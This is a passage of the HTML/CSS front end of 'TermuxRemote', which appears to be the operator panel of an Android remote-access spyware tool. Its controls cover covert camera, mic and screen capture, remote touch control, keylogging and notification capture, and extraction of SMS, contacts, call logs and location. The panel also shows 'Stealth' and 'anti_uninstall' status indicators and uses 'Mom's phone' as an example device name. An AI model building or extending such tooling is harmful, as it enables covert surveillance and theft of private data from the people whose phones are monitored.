.gallery-item{background:var(--panel2);border:1px solid var(--border);border-radius:10px;overflow:hidden;display:flex;flex-direction:column}
.gallery-item:hover{border-color:var(--cyan);transform:translateY(-2px)}
.gallery-thumb{width:100%;height:150px;position:relative;overflow:hidden;cursor:pointer;background:var(--panel3)}
.gallery-thumb img,.gallery-thumb video{width:100%;height:100%;object-fit:cover}
.gallery-thumb .thumb-icon{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:52px;color:var(--text-mute);opacity:.5}
.gallery-thumb .thumb-badge{position:absolute;top:8px;right:8px;background:rgba(0,0,0,.75);color:#fff;padding:3px 9px;border-radius:12px;font-size:10px;font-weight:700;text-transform:uppercase;z-index:3}
.gallery-thumb .thumb-badge.device{background:rgba(199,155,255,.85)}
.gallery-thumb .thumb-badge.enc{background:rgba(110,231,165,.9);color:#03212a}
.gallery-info{padding:11px 13px;flex:1;display:flex;flex-direction:column;gap:7px}
.gallery-item .g-name{color:var(--text);font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:ui-monospace,Consolas,monospace;font-weight:500}
.gallery-item .g-meta{color:var(--text-mute);font-size:10.5px}
.gallery-acts{display:flex;gap:6px;margin-top:auto}
.gallery-acts a,.gallery-acts button{flex:1;text-align:center;background:transparent;border:1px solid var(--border);color:var(--text-dim);padding:6px 4px;border-radius:6px;cursor:pointer;font-family:inherit;font-size:11.5px;text-decoration:none;font-weight:500}
.gallery-acts a:hover{color:var(--green);border-color:var(--green)}
.gallery-acts button.rm:hover{color:var(--red);border-color:var(--red)}
.gallery-empty{grid-column:1/-1;padding:44px;text-align:center;color:var(--text-mute);font-size:13px;border:1px dashed var(--border);border-radius:var(--radius)}
.file-browser{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden}
.path-bar{display:flex;gap:8px;align-items:center;padding:12px 14px;background:var(--panel2);border-bottom:1px solid var(--border);flex-wrap:wrap}
.breadcrumbs{flex:1;min-width:180px;display:flex;align-items:center;gap:3px;padding:6px 12px;background:var(--bg);border-radius:8px;font-family:ui-monospace,Consolas,monospace;font-size:12.5px;color:var(--cyan)}
.breadcrumbs .crumb{cursor:pointer;padding:2px 4px;border-radius:4px}
.breadcrumbs .crumb:hover{background:var(--panel3)}
.file-list{max-height:calc(100vh - 340px);overflow-y:auto}
.file-row{display:grid;grid-template-columns:32px 1fr 100px 180px;gap:12px;padding:10px 16px;align-items:center;border-bottom:1px solid var(--border-soft)}
.file-row.selectable{grid-template-columns:32px 32px 1fr 100px 180px}
.file-row.selected{background:rgba(77,208,225,.08);border-left:3px solid var(--cyan)}
.file-row:hover{background:var(--panel2)}
.file-row .icon{font-size:18px;text-align:center}
.file-row .check{display:flex;align-items:center;justify-content:center}
input[type=checkbox].file-cb{width:16px;height:16px;cursor:pointer;accent-color:var(--cyan)}
.file-row .name{font-size:13px;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;cursor:pointer}
.file-row .name.dir{color:var(--cyan);font-weight:500}
.file-row .size{font-family:ui-monospace,Consolas,monospace;font-size:11.5px;color:var(--text-mute);text-align:right}
.file-row .acts{display:flex;gap:6px;justify-content:flex-end}
.file-row .acts button{background:transparent;border:1px solid var(--border);color:var(--text-dim);padding:4px 9px;border-radius:5px;cursor:pointer;font-size:11px;font-family:inherit}
.file-row .acts button:hover{color:var(--cyan);border-color:var(--cyan)}
.file-row .acts button.del:hover{color:var(--red);border-color:var(--red)}
.file-empty{padding:44px;text-align:center;color:var(--text-mute);font-size:13px}
.bulk-bar{display:none;padding:10px 16px;background:var(--panel3);border-bottom:1px solid var(--border);gap:10px;align-items:center;flex-wrap:wrap}
.bulk-bar.show{display:flex}
.bulk-bar .count{color:var(--cyan);font-weight:700;font-size:12.5px;min-width:90px}
.drop-zone{position:fixed;inset:0;background:rgba(77,208,225,.15);border:4px dashed var(--cyan);z-index:1500;display:none;align-items:center;justify-content:center;pointer-events:none;font-size:22px;color:var(--cyan);font-weight:700}
.drop-zone.show{display:flex}
.data-output{background:var(--bg-soft);border:1px solid var(--border);border-radius:10px;padding:16px;font-family:ui-monospace,Consolas,monospace;font-size:12.5px;color:var(--text);white-space:pre-wrap;word-break:break-word;max-height:520px;overflow-y:auto;line-height:1.55}
.subtabs{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
.subtab{background:var(--panel2);border:1px solid var(--border);color:var(--text-dim);padding:7px 15px;border-radius:20px;cursor:pointer;font-family:inherit;font-size:12px;font-weight:500}
.subtab.active{background:var(--cyan);color:#03212a;border-color:var(--cyan);font-weight:600}
.log-output{background:var(--bg-soft);border:1px solid var(--border);border-radius:10px;padding:14px;font-family:ui-monospace,Consolas,monospace;font-size:12px;max-height:calc(100vh - 240px);overflow-y:auto;line-height:1.65}
.log-entry{padding:5px 0;border-bottom:1px solid rgba(255,255,255,.03);display:flex;gap:8px;align-items:flex-start}
.log-entry .ts{color:var(--text-mute);flex-shrink:0;font-size:11px;padding-top:2px}
.log-entry .txt{flex:1;word-break:break-word}
.log-entry.battery{color:var(--yellow)}
.log-entry.sms{color:var(--magenta)}
.log-entry.location{color:var(--blue)}
.log-entry.wifi{color:var(--cyan)}
.log-entry.connect{color:var(--green)}
.log-entry.disconnect{color:var(--red)}
.log-entry.info{color:var(--cyan)}
.log-entry.err{color:var(--red)}
.log-entry.warn{color:var(--yellow)}
.annot-toolbar{display:none;gap:6px;padding:8px;background:var(--panel2);border-radius:8px;margin-top:8px;flex-wrap:wrap;align-items:center}
.annot-toolbar.show{display:flex}
.annot-tool{background:var(--panel);border:1px solid var(--border);color:var(--text-dim);padding:5px 11px;border-radius:6px;cursor:pointer;font-size:12px;font-family:inherit;font-weight:500}
.annot-tool:hover{border-color:var(--cyan);color:var(--cyan)}
.annot-tool.active{background:var(--cyan);color:#03212a;border-color:var(--cyan);font-weight:700}
.annot-toolbar input[type=color]{width:36px;height:30px;padding:2px;background:var(--panel);border:1px solid var(--border);border-radius:6px;cursor:pointer}
.annot-toolbar input[type=range]{width:80px}
#annot-canvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:none;z-index:10}
.tag-chip{display:inline-flex;align-items:center;background:var(--panel3);color:var(--cyan);padding:2px 8px;border-radius:10px;font-size:10.5px;margin:2px;font-weight:600}
.tag-chip .x{cursor:pointer;margin-left:5px;color:var(--text-mute);font-weight:700}
.tag-chip .x:hover{color:var(--red)}
.notes-box{width:100%;min-height:68px;background:var(--panel2);border:1px solid var(--border);color:var(--text);padding:10px 12px;border-radius:8px;font-family:inherit;font-size:13px;resize:vertical;outline:none}
.notes-box:focus{border-color:var(--cyan)}
.sidebar-tags{display:flex;flex-wrap:wrap;gap:3px;margin-top:5px;padding-left:16px}
.client-item .display-name{color:var(--cyan);font-weight:700}
.timeline{background:var(--bg-soft);border:1px solid var(--border);border-radius:10px;padding:12px;max-height:calc(100vh - 340px);overflow-y:auto}
.timeline-event{padding:7px 10px;border-left:3px solid var(--border);margin-bottom:5px;border-radius:0 6px 6px 0;background:var(--panel);display:flex;gap:10px;align-items:flex-start;font-size:12px}
.timeline-event .t-ts{color:var(--text-mute);font-family:ui-monospace,monospace;font-size:11px;flex-shrink:0;padding-top:2px;min-width:64px}
.timeline-event .t-client{color:var(--cyan);font-weight:600;flex-shrink:0;font-size:11px}
.timeline-event .t-type{color:var(--text-dim);font-weight:700;text-transform:uppercase;font-size:10px;flex-shrink:0;padding-top:1px;min-width:96px;letter-spacing:.4px}
.timeline-event .t-data{flex:1;word-break:break-word;font-family:ui-monospace,monospace;font-size:11.5px;color:var(--text);line-height:1.5}
.timeline-event[data-type="keylog"]{border-left-color:var(--green)}
.timeline-event[data-type="notification"]{border-left-color:var(--magenta)}
.timeline-event[data-type="battery"]{border-left-color:var(--yellow)}
.timeline-event[data-type="sms"]{border-left-color:var(--magenta)}
.timeline-event[data-type="location"]{border-left-color:var(--blue)}
.timeline-event[data-type="wifi_change"]{border-left-color:var(--cyan)}
.timeline-event[data-type="client_connect"]{border-left-color:var(--green)}
.timeline-event[data-type="client_disconnect"]{border-left-color:var(--red)}
.timeline-event[data-type="perm_state"]{border-left-color:var(--yellow)}
.timeline-event[data-type="anti_uninstall"]{border-left-color:var(--red)}
.timeline-event[data-type="screen_state"]{border-left-color:var(--blue)}
.rec-indicator{display:inline-flex;align-items:center;gap:6px;background:rgba(255,60,60,.14);color:#ff5a5a;padding:4px 11px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px}
.rec-indicator .dot{width:8px;height:8px;border-radius:50%;background:#ff3b30;animation:pulse-dot 1.2s infinite}
.rec-indicator.off{background:var(--panel2);color:var(--text-mute)}
.rec-indicator.off .dot{background:#666;animation:none}
.overview-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));gap:14px}
.ov-card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:18px;transition:all .18s;cursor:pointer;position:relative;overflow:hidden}
.ov-card:hover{border-color:var(--cyan);transform:translateY(-3px);box-shadow:0 12px 32px rgba(0,0,0,.4)}
.ov-card.active{border-color:var(--cyan);background:linear-gradient(135deg,rgba(77,208,225,.08),var(--panel))}
.ov-card.active::before{content:'';position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--grad1)}
.ov-head{display:flex;align-items:center;gap:12px;margin-bottom:14px}
.ov-avatar{width:46px;height:46px;border-radius:12px;background:var(--grad1);display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:700;color:#03212a;flex-shrink:0}
.ov-info{flex:1;min-width:0}
.ov-info .ov-name{font-size:14px;font-weight:700;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.ov-info .ov-sub{font-size:11px;color:var(--text-mute);font-family:ui-monospace,monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-top:2px}
.ov-stats{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.ov-stat{background:var(--panel2);border-radius:8px;padding:8px 10px;min-width:0}
.ov-stat .l{font-size:9.5px;color:var(--text-mute);text-transform:uppercase;letter-spacing:.8px;font-weight:700}
.ov-stat .v{font-size:12.5px;color:var(--text);font-weight:600;font-family:ui-monospace,monospace;margin-top:3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.ov-stat .v.ok{color:var(--green)}.ov-stat .v.warn{color:var(--yellow)}.ov-stat .v.bad{color:var(--red)}
.ov-tags{margin-top:10px;display:flex;flex-wrap:wrap;gap:3px}
.ov-notes{margin-top:8px;font-size:11.5px;color:var(--text-dim);font-style:italic;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.bar-chart{display:flex;align-items:flex-end;gap:2px;height:60px;background:var(--bg-soft);border-radius:6px;padding:6px;margin-top:8px;overflow:hidden}
.bar{flex:1;background:var(--cyan);min-height:2px;border-radius:2px 2px 0 0;transition:height .3s}
.bar.warn{background:var(--yellow)}.bar.bad{background:var(--red)}
.data-table{width:100%;border-collapse:collapse;font-size:12.5px}
.data-table th{text-align:left;padding:8px 10px;color:var(--text-mute);font-size:10.5px;text-transform:uppercase;letter-spacing:.9px;border-bottom:1px solid var(--border);font-weight:700}
.data-table td{padding:8px 10px;border-bottom:1px solid var(--border-soft);font-family:ui-monospace,Consolas,monospace;color:var(--text)}
.data-table tr:hover td{background:var(--panel2)}

/* ★ Projection banner */
#proj-banner{display:none;position:fixed;top:0;left:0;right:0;z-index:900;
  background:linear-gradient(90deg,#ff7a85 0%,#ff5a5a 100%);color:#fff;
  padding:10px 20px;font-weight:600;text-align:center;
  box-shadow:0 4px 16px rgba(255,90,90,.5);
  font-size:13px;line-height:1.4}
#proj-banner.show{display:block}
#proj-banner .pb-btn{margin-left:12px;background:#fff;color:#c00;border:none;
  padding:5px 14px;border-radius:6px;cursor:pointer;font-weight:700;font-size:12px}
#proj-banner .pb-close{margin-left:8px;background:transparent;color:#fff;
  border:1px solid rgba(255,255,255,.5);padding:5px 12px;border-radius:6px;
  cursor:pointer;font-size:12px}
#proj-banner .pb-spin{display:inline-block;margin-left:8px;opacity:.85}

#progress-overlay{position:fixed;inset:0;background:rgba(5,10,15,.88);z-index:2000;display:none;align-items:center;justify-content:center}
#progress-overlay.show{display:flex}
#progress-overlay .progress-box{background:var(--panel);border:1px solid var(--border);border-radius:18px;padding:40px 60px;text-align:center;min-width:380px}
#progress-overlay .progress-title{color:var(--cyan);font-size:13px;text-transform:uppercase;letter-spacing:3px;margin-bottom:20px;font-weight:700}
#progress-overlay .progress-timer{font-size:78px;font-weight:200;color:var(--text);font-family:ui-monospace,Consolas,monospace;margin-bottom:26px;line-height:1}
#progress-overlay .progress-track{height:6px;background:var(--panel2);border-radius:3px;overflow:hidden}
#progress-overlay .progress-bar{height:100%;background:var(--grad1);width:0%;transition:width 1s linear}
#toast-container{position:fixed;bottom:24px;right:24px;display:flex;flex-direction:column;gap:10px;z-index:1000;pointer-events:none;max-width:420px}
.toast{background:var(--panel);border:1px solid var(--border);border-left:3px solid var(--cyan);color:var(--text);padding:13px 18px;border-radius:10px;font-size:13px;box-shadow:var(--shadow);pointer-events:auto;font-weight:500}
.toast.ok{border-left-color:var(--green)}
.toast.err{border-left-color:var(--red)}
.toast.warn{border-left-color:var(--yellow)}
#lightbox{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:3000;display:none;align-items:center;justify-content:center;padding:32px}
#lightbox.show{display:flex}
#lightbox img,#lightbox video{max-width:100%;max-height:100%;border-radius:10px}
#lightbox .lb-close{position:absolute;top:20px;right:24px;background:var(--panel);border:1px solid var(--border);color:var(--text);width:44px;height:44px;border-radius:50%;cursor:pointer;font-size:20px;display:flex;align-items:center;justify-content:center}
.modal-bg{position:fixed;inset:0;background:rgba(5,10,15,.75);z-index:2500;display:none;align-items:center;justify-content:center;padding:20px}
.modal-bg.show{display:flex}
.modal{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:26px;max-width:440px;width:100%}
.modal h2{margin:0 0 6px;font-size:17px;font-weight:700}
.modal .modal-sub{color:var(--text-mute);font-size:12.5px;margin-bottom:20px}
.modal label{display:block;font-size:11.5px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px;font-weight:600;margin:14px 0 6px}
.modal input{width:100%}
.modal-actions{display:flex;gap:10px;margin-top:22px;justify-content:flex-end}
.modal .msg{margin-top:12px;padding:10px 12px;border-radius:8px;font-size:12.5px;display:none}
.modal .msg.show{display:block}
.modal .msg.err{background:rgba(255,122,133,.12);color:var(--red)}
.modal .msg.ok{background:rgba(110,231,165,.12);color:var(--green)}
.hidden{display:none !important}
@media(max-width:820px){.sidebar{position:fixed;top:0;left:0;bottom:0;z-index:100}
  .sidebar.collapsed{margin-left:-290px}
  .menu-toggle{display:flex}
  .file-row,.file-row.selectable{grid-template-columns:28px 28px 1fr 76px}.file-row .size{display:none}
  .gallery-list{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}
  .panel{padding:14px}}
</style>
</head>
<body>

<!-- ★ Projection banner — visible on all tabs when screen capture missing -->
<div id="proj-banner">
  <span id="proj-banner-msg">⚠ Screen capture not granted — control &amp; live screen won't work</span>
  <button class="pb-btn" onclick="reqScreen()">📸 Re-grant now</button>
  <button class="pb-btn" onclick="bannerManualRetry()">🔄 Retry</button>
  <button class="pb-close" onclick="hideProjBanner()">Dismiss</button>
  <span class="pb-spin" id="proj-banner-spin"></span>
</div>

<aside class="sidebar" id="sidebar">
  <div class="brand">
    <div class="logo">◆</div>
    <div class="brand-text">
      <h1>TermuxRemote</h1>
      <div class="sub">Control Panel · v3.10.1</div>
    </div>
    <button class="theme-toggle" id="theme-toggle" title="Toggle theme">🌙</button>
  </div>
  <div class="sidebar-search">
    <input type="text" id="client-search" placeholder="Filter clients…">
  </div>
  <div class="sidebar-title">
    <span>Clients</span>
    <span class="count" id="client-count">0</span>
  </div>
  <ul class="client-list" id="client-list">
    <li class="no-clients">waiting for connection…</li>
  </ul>
  <div class="sidebar-footer">
    <div class="row"><span>Active</span><span class="val" id="sf-active">—</span></div>
    <div class="row"><span>Connected</span><span class="val" id="sf-count">0</span></div>
    <div class="row"><span>Link</span><span><span class="health-dot" id="health-dot"></span><span class="val" id="health-text">online</span></span></div>
  </div>
</aside>

<main class="main">
  <div class="topbar">
    <button class="menu-toggle" id="menu-toggle">☰</button>
    <div class="breadcrumb">
      <span class="root">DEVICE</span><span>›</span>
      <span class="cur" id="bc-cur">no client selected</span>
    </div>
    <div class="topbar-info">
      <span class="clock" id="clock">--:--:--</span>
      <button class="icon-btn" id="pw-btn" title="Change password">🔑</button>
      <button class="icon-btn" id="logout-btn" title="Sign out">⏻</button>
    </div>
  </div>
  <nav class="tabs" id="tabs">
    <button class="tab active" data-tab="dashboard">📊 Dashboard</button>
    <button class="tab" data-tab="overview">🖥 Overview</button>
    <button class="tab" data-tab="live">🔴 Live</button>
    <button class="tab" data-tab="control">🎮 Control</button>
    <button class="tab" data-tab="files">📁 Files</button>
    <button class="tab" data-tab="apps">📦 Apps</button>
    <button class="tab" data-tab="camera">📷 Camera</button>
    <button class="tab" data-tab="screen">🖥 Screen</button>
    <button class="tab" data-tab="monitor">📈 Monitor</button>
    <button class="tab" data-tab="data">🗄 Data</button>
    <button class="tab" data-tab="system">⚙ System</button>
    <button class="tab" data-tab="tools">🛠 Tools</button>
    <button class="tab" data-tab="network">🌐 Network</button>
    <button class="tab" data-tab="crypto">🔐 Encryption</button>
    <button class="tab" data-tab="session">🎬 Session <span class="rec-indicator off" id="rec-indicator" style="display:none;padding:1px 7px;font-size:9px"><span class="dot" style="width:6px;height:6px"></span>REC</span></button>
    <button class="tab" data-tab="log">📜 Log <span class="badge hidden" id="log-badge">0</span></button>
    <button class="tab" data-tab="keylog">⌨ Keylog <span class="badge hidden" id="keylog-badge">0</span> <span class="badge mag hidden" id="notif-badge">0</span></button>
  </nav>

  <div class="panels">
    <!-- ═══ DASHBOARD ═══ -->
    <section class="panel active" id="panel-dashboard">
      <div class="card hero">
        <div class="hero-device">
          <div class="hero-avatar">📱</div>
          <div class="hero-info">
            <div class="name"><span id="hero-id">No device selected</span><span class="pill" id="hero-status">offline</span></div>
            <div class="sub" id="hero-sub">Connect a client to begin</div>
          </div>
          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button class="btn" onclick="refreshInfo()">⟳ Refresh</button>
            <button class="btn" onclick="switchTab('live')">🔴 Live</button>
            <button class="btn" onclick="switchTab('control')">🎮 Control</button>
            <button class="btn" onclick="switchTab('monitor')">📈 Monitor</button>
          </div>
        </div>
        <div class="hero-stats">
          <div class="hero-stat"><span class="lbl">Working Dir</span><span class="val" id="hero-cwd">—</span></div>
          <div class="hero-stat"><span class="lbl">Uptime</span><span class="val" id="hero-uptime">—</span></div>
          <div class="hero-stat"><span class="lbl">Build</span><span class="val" id="hero-build">—</span></div>
        </div>
      </div>
      <div class="card" id="notes-card">
        <h3 class="card-title">
          <span>📝 Notes &amp; Tags</span>
          <button class="btn small primary" onclick="saveClientMeta()">💾 Save</button>
        </h3>
        <div class="row" style="margin-bottom:10px">
          <label style="min-width:100px;font-size:12px">Display name</label>
          <input type="text" id="meta-display-name" placeholder="e.g. Mom's phone" maxlength="64">
        </div>
        <div class="row" style="margin-bottom:10px">
          <label style="min-width:100px;font-size:12px">Tags</label>
          <input type="text" id="meta-tag-input" placeholder="type tag + Enter" style="max-width:200px">
          <div id="meta-tags" style="display:inline-flex;flex-wrap:wrap;gap:4px;align-items:center"></div>
        </div>
        <div class="row" style="margin-bottom:0">
          <label style="min-width:100px;font-size:12px;align-self:flex-start;padding-top:6px">Notes</label>
          <textarea id="meta-notes" class="notes-box" placeholder="anything you want to remember about this device…"></textarea>
        </div>
      </div>
      <div class="card">
        <h3 class="card-title">Device Status</h3>
        <div class="info-grid">
          <div class="info-item"><div class="label">Client ID</div><div class="value cyan" id="di-id">-</div></div>
          <div class="info-item"><div class="label">Model</div><div class="value" id="di-model">-</div></div>
          <div class="info-item"><div class="label">Android</div><div class="value" id="di-android">-</div></div>
          <div class="info-item"><div class="label">Build</div><div class="value" id="di-build">-</div></div>
          <div class="info-item"><div class="label">Working Dir</div><div class="value" id="di-cwd">-</div></div>
          <div class="info-item"><div class="label">Root</div><div class="value" id="di-root">-</div></div>
          <div class="info-item"><div class="label">All Files</div><div class="value" id="di-allfiles">-</div></div>
          <div class="info-item"><div class="label">Screen Capture</div><div class="value" id="di-screencap">-</div></div>
          <div class="info-item"><div class="label">Keylogger</div><div class="value" id="di-keylogger">-</div></div>
          <div class="info-item"><div class="label">Notifications</div><div class="value" id="di-notif">-</div></div>
          <div class="info-item"><div class="label">Usage Access</div><div class="value" id="di-usage">-</div></div>
          <div class="info-item"><div class="label">Stealth</div><div class="value" id="di-stealth">-</div></div>
        </div>
      </div>
      <div class="card">
        <h3 class="card-title">📸 Capture Media</h3>
        <div class="row">
          <div class="segmented" id="dash-cam-facing">
            <button data-facing="back" class="active">Back camera</button>
            <button data-facing="front">Front camera</button>
          </div>
          <label style="margin-left:auto">Duration:</label>
          <input type="number" id="dash-duration" value="5" min="1" max="600">
          <span style="color:var(--text-mute);font-size:12px">sec</span>
        </div>
        <div class="actions-grid" style="margin-top:12px">
          <button class="action-btn" id="btn-photo" onclick="dashPhoto(this)"><span class="icon">📷</span><span class="label">Photo</span></button>
          <button class="action-btn" id="btn-video" onclick="dashVideo(this)"><span class="icon">🎥</span><span class="label">Video</span></button>
          <button class="action-btn" id="btn-screenshot" onclick="dashScreenshot(this)"><span class="icon">📸</span><span class="label">Screenshot</span></button>
          <button class="action-btn" id="btn-screenrec" onclick="dashScreenrec(this)"><span class="icon">🎬</span><span class="label">Screen Record</span></button>
          <button class="action-btn" id="btn-screenrec-av" onclick="dashScreenrecAv(this)"><span class="icon">🎞</span><span class="label">Screen + Audio</span></button>
          <button class="action-btn" id="btn-micaudio" onclick="dashMicaudio(this)"><span class="icon">🎙</span><span class="label">Mic Audio</span></button>
        </div>
        <div id="media-status" style="margin-top:14px;padding:10px 14px;background:var(--panel2);border-radius:8px;font-size:12.5px;color:var(--text-dim);display:none"></div>
      </div>
      <div class="card">
        <h3 class="card-title">🖼 Captures Gallery <button class="btn small" onclick="clearGallery()">Clear</button></h3>
        <div id="gallery-list" class="gallery-list"><div class="gallery-empty">No captures yet</div></div>
      </div>
      <div class="card">
        <h3 class="card-title">⚡ Quick Actions</h3>
        <div class="actions-grid">
          <button class="action-btn" onclick="qa('location',event)"><span class="icon">📍</span><span class="label">Location</span></button>
          <button class="action-btn" onclick="qa('torch on',event)"><span class="icon">🔦</span><span class="label">Torch On</span></button>
          <button class="action-btn" onclick="qa('torch off',event)"><span class="icon">🌑</span><span class="label">Torch Off</span></button>
          <button class="action-btn" onclick="qa('contacts',event)"><span class="icon">👥</span><span class="label">Contacts</span></button>
          <button class="action-btn" onclick="qa('sms',event)"><span class="icon">💬</span><span class="label">SMS</span></button>
          <button class="action-btn" onclick="qa('calllog',event)"><span class="icon">📞</span><span class="label">Call Log</span></button>
          <button class="action-btn" onclick="qa('apps',event)"><span class="icon">📦</span><span class="label">Apps</span></button>
          <button class="action-btn" onclick="qa('camlist',event)"><span class="icon">📋</span><span class="label">Cameras</span></button>
          <button class="action-btn" onclick="qa('version',event)"><span class="icon">ℹ</span><span class="label">Version</span></button>
          <button class="action-btn" onclick="qa('ping',event)"><span class="icon">🏓</span><span class="label">Ping</span></button>
          <button class="action-btn" onclick="qa('pwd',event)"><span class="icon">📂</span><span class="label">Pwd</span></button>
          <button class="action-btn" onclick="qa('info',event)"><span class="icon">🔎</span><span class="label">Info</span></button>
        </div>
      </div>
    </section>

    <!-- ═══ OVERVIEW ═══ -->
    <section class="panel" id="panel-overview">
      <div class="card">
        <h3 class="card-title">
          <span>🖥 All Devices</span>
          <div class="row" style="margin:0">
            <input type="text" id="ov-search" placeholder="filter by name/tag/id…" oninput="renderOverview()" style="max-width:220px">
            <label style="font-size:12px;color:var(--text-dim);display:flex;gap:5px;align-items:center">
              <input type="checkbox" id="ov-only-tagged" onchange="renderOverview()"> only tagged
            </label>
            <button class="btn small" onclick="loadOverview()">⟳ Refresh</button>
          </div>
        </h3>
        <div id="overview-grid" class="overview-grid">
          <div class="gallery-empty">No clients connected</div>
        </div>
      </div>
    </section>

    <!-- ═══ LIVE ═══ -->
    <section class="panel" id="panel-live">
      <div class="card">
        <h3 class="card-title">🔴 Live Stream</h3>
        <div class="row">
          <div class="segmented" id="live-mode">
            <button data-mode="photo" class="active">📷 Photo MJPEG</button>
            <button data-mode="video">📹 Camera Video</button>
            <button data-mode="screen">🖥 Screen Video</button>
          </div>
          <div class="segmented" id="live-facing" style="margin-left:auto">
            <button data-facing="back" class="active">📷 Back</button>
            <button data-facing="front">🤳 Front</button>
          </div>
        </div>
        <div class="row">
          <label id="lbl-fps">FPS:</label>
          <input type="number" id="live-fps" value="1" min="0.3" max="4" step="0.1">
          <label id="lbl-secs" style="display:none">Clip length (sec):</label>
          <input type="number" id="live-secs" value="2" min="1" max="10" style="display:none;width:80px">
          <button class="btn primary" id="live-btn" onclick="toggleLive()">▶ Start</button>
          <button class="btn" id="live-snap" onclick="liveSnap()" disabled>📸 Save frame</button>
        </div>
        <div class="row" style="margin-top:6px">
          <button class="btn" onclick="reqScreen()">📸 Grant screen capture</button>
          <span style="color:var(--text-mute);font-size:12px">
            (needed for "Screen Video" mode and the Control tab)
          </span>
        </div>
        <div class="live-view" id="live-view">
          <div class="live-indicator paused" id="live-ind"><span class="dot"></span><span id="live-ind-text">Offline</span></div>
          <div class="live-stats" id="live-stats" style="display:none">—</div>
          <div class="live-placeholder" id="live-ph">📡<div>Live stream is off</div></div>
          <img id="live-img" style="display:none" alt="live">
          <video id="live-vid" style="display:none" muted autoplay playsinline></video>
        </div>
      </div>
    </section>

    <!-- ═══ CONTROL ═══ -->
    <section class="panel" id="panel-control">
      <div class="card">
        <h3 class="card-title" style="flex-wrap:wrap">
          <span>🎮 Screen Control <span id="ctrl-fps-badge" style="color:var(--green);font-family:ui-monospace,monospace;font-size:11px">—</span></span>
          <div class="row" style="margin:0;gap:6px">
            <button class="btn primary" id="ctrl-start" onclick="ctrlStart()">▶ Start</button>
            <button class="btn danger" id="ctrl-stop" onclick="ctrlStop()">⏹ Stop</button>
            <button class="btn" onclick="reqScreen()">📸 Grant screen</button>
          </div>
        </h3>
        <div class="row" style="gap:14px;background:var(--panel2);padding:10px 14px;border-radius:10px;margin-bottom:10px">
          <label style="font-size:12px;font-weight:600">Quality:</label>
          <div class="segmented" id="ctrl-quality">
            <button data-q="30" data-w="480">🚀 Turbo</button>
            <button data-q="55" data-w="720" class="active">⚡ Fast</button>
            <button data-q="75" data-w="1080">✨ HQ</button>
            <button data-q="90" data-w="1440">💎 Ultra</button>
          </div>
          <label style="font-size:12px;font-weight:600;margin-left:auto">FPS:</label>
          <div class="segmented" id="ctrl-fps-set">
            <button data-fps="1">1</button>
            <button data-fps="3" class="active">3</button>
            <button data-fps="5">5</button>
            <button data-fps="8">8</button>
            <button data-fps="10">10</button>
          </div>
          <span id="ctrl-net-stats" style="font-size:11px;color:var(--text-mute);font-family:ui-monospace,monospace">—</span>
        </div>
        <div class="row">
          <div class="segmented" id="ctrl-mode">
            <button data-mode="tap" class="active">👆 Tap</button>
            <button data-mode="swipe">👉 Swipe</button>
            <button data-mode="scroll">📜 Scroll</button>
            <button data-mode="longpress">⏱ Long-press</button>
          </div>
          <button class="btn small" id="ctrl-zoom-btn" onclick="ctrlToggleZoom()">🔍 Zoom fit</button>
          <button class="btn small" onclick="ctrlReplayLast()">↺ Replay last</button>
          <button class="btn small" onclick="api('/api/screen/off',{})">🔒 Screen off</button>
          <button class="btn small" onclick="api('/api/screen/on',{})">☀ Screen on</button>
        </div>
        <div id="ctrl-view" style="position:relative;width:100%;background:#000;border-radius:12px;overflow:hidden;margin-top:10px;border:1px solid var(--border);user-select:none;touch-action:none">
          <img id="ctrl-img" style="width:100%;display:block;cursor:crosshair;transition:transform .1s" alt="screen">
          <canvas id="annot-canvas"></canvas>
          <div id="ctrl-overlay" style="position:absolute;inset:0;pointer-events:none;z-index:20">
            <div id="ctrl-marker" style="position:absolute;width:36px;height:36px;border:2px solid #4dd0e1;border-radius:50%;transform:translate(-50%,-50%);opacity:0;transition:opacity .15s;box-shadow:0 0 12px #4dd0e1"></div>
            <div id="ctrl-drag-line" style="position:absolute;height:2px;background:#ff3b30;opacity:0;transform-origin:left center;pointer-events:none"></div>
          </div>
          <div id="ctrl-offline" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.7);color:var(--text-dim);font-size:14px">
            <div style="text-align:center">📱<br>Click <b>▶ Start</b> to begin</div>
          </div>
        </div>
        <div class="row" style="margin-top:12px;gap:8px">
          <span style="font-size:11px;color:var(--text-mute);font-weight:700;text-transform:uppercase;letter-spacing:1px;width:100%">Quick gestures</span>
          <button class="btn" onclick="ctrlScrollGesture('up')">⬆ Scroll up</button>
          <button class="btn" onclick="ctrlScrollGesture('down')">⬇ Scroll down</button>
          <button class="btn" onclick="ctrlScrollGesture('left')">⬅ Scroll left</button>
          <button class="btn" onclick="ctrlScrollGesture('right')">➡ Scroll right</button>
        </div>
        <div class="row" style="margin-top:8px">
          <button class="btn" onclick="ctrlAction('back')">◁ Back</button>
          <button class="btn" onclick="ctrlAction('home')">⌂ Home</button>
          <button class="btn" onclick="ctrlAction('recents')">▢ Recents</button>
          <button class="btn" onclick="ctrlAction('notifications')">🔔 Shade</button>
          <button class="btn" onclick="ctrlAction('quick_settings')">⚙ Quick</button>
          <button class="btn" onclick="ctrlAction('lock')">🔒 Lock</button>
          <button class="btn" onclick="ctrlAction('power')">⏻ Power</button>
